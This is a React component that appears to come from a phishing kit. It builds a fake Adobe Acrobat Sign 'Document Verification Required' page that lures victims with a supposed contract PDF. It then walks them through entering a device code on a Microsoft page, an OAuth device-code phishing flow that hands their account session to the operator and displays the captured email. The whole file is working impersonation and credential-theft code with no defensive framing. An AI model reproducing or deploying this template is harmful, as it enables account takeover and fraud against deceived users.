import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function AdobeSignTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow('adobe-sign');

  return (
    <div className="tpl-page" style={{ background: '#f5f5f5' }}>
      <div className="tpl-container" style={{ maxWidth: 520 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#E8352B"/><text x="8" y="22" fill="white" fontSize="16" fontWeight="bold" fontFamily="Arial">A</text></svg>
          <span style={{ fontSize: 18, fontWeight: 600, color: '#2c2c2c' }}>Adobe Acrobat Sign</span>
        </div>

        <div className="tpl-card">
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title">Document Verification Required</h1>
              <p className="tpl-text">You have been sent a document that requires identity verification before viewing. Please verify your account to access the document.</p>
              <div className="tpl-info-box" style={{ background: '#fff3f2', borderColor: '#ffc5c1', color: '#b71c1c' }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E8352B" strokeWidth="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                <span>Contract_Agreement_2024.pdf requires verification</span>
              </div>
              <button className="tpl-btn" style={{ background: '#E8352B' }} onClick={f.handleStart}>Verify & View Document</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Preparing verification...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Enter Verification Code</h1>
              <p className="tpl-text">Use this code to verify your identity and access the document.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">VERIFICATION CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the code above</div><div className="tpl-step">2. Click verify and enter the code on the Microsoft page</div></div>
              <button className="tpl-btn" style={{ background: '#E8352B' }} onClick={f.handleVerify}>Verify Identity</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Waiting for verification...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Verification Complete</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">You can now access the document.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Verify another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><p className="tpl-text">Please try again.</p><button className="tpl-btn" style={{ background: '#E8352B' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#E8352B' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer"><span>Adobe Terms of Use</span><span>Privacy Policy</span></div>
      </div>
    </div>
  );
}
